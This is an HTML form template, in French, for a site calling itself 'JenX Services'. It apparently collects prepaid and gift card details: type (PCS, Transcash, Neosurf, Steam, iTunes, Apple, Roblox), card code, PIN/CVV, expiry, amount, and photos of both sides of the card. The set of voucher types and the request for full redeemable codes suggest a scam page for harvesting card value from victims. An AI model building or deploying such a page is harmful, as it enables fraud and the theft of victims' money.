<!-- templates/dynamic_form_card.html -->
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JenX Services - Détails de la carte</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gray-100 p-4">
    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md">
        <h2 class="text-3xl font-bold text-center text-gray-800 mb-8">Détails de votre carte prépayée/cadeau</h2>
        <form action="/upload_card_details" method="POST" enctype="multipart/form-data" class="space-y-6">
            <div>
                <label for="card_type" class="block text-sm font-medium text-gray-700">Type de carte</label>
                <select id="card_type" name="card_type" required
                        class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                    <option value="">Sélectionnez un type</option>
                     <option value="PCS">PCS card</option>
                     <option value="Transcash">Transcash card</option>
                     <option value="Steam">Steam card</option>
                     <option value="iTunes">iTunes card</option>
                     <option value="Neosurf">Neosurf card</option>
                     <option value="Neosurf">apple card</option>
                     <option value="Neosurf">Roblox card</option>
                     <option value="Autre">Autre</option>
                </select>
            </div>
            <div>
                <label for="card_number" class="block text-sm font-medium text-gray-700">Numéro/code de la carte</label>
                <input type="text" id="card_number" name="card_number" required
                       class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                       placeholder="Ex: 1234-5678-9012-3456">
            </div>
            <div>
                <label for="card_code" class="block text-sm font-medium text-gray-700">PIN/CVV (si applicable)</label>
                <input type="text" id="card_code" name="card_code" 
                       class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                       placeholder="Ex: 1234 / 123">
            </div>
            <div>
                <label for="card_date" class="block text-sm font-medium text-gray-700">Date d'expiration (si applicable)</label>
                <input type="text" id="card_date" name="card_date"
                       class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                       placeholder="MM/AA (Ex: 12/25)">
            </div>
            <div>
                <label for="card_amount" class="block text-sm font-medium text-gray-700">Montant de la carte ({{ currency }})</label>
                <input type="number" id="card_amount" name="card_amount" required step="0.01"
                       class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm"
                       placeholder="Ex: 50.00">
            </div>
            <div>
                <label for="recto_photo" class="block text-sm font-medium text-gray-700">Photo du recto de la carte</label>
                <input type="file" id="recto_photo" name="recto_photo" accept="image/*" required
                       class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
            </div>
            <div>
                <label for="verso_photo" class="block text-sm font-medium text-gray-700">Photo du verso de la carte</label>
                <input type="file" id="verso_photo" name="verso_photo" accept="image/*" required
                       class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
            </div>
            <div>
                <button type="submit"
                        class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-lg font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition duration-150 ease-in-out">
                    Soumettre les détails de la carte
                </button>
            </div>
        </form>
    </div>
</body>
</html>
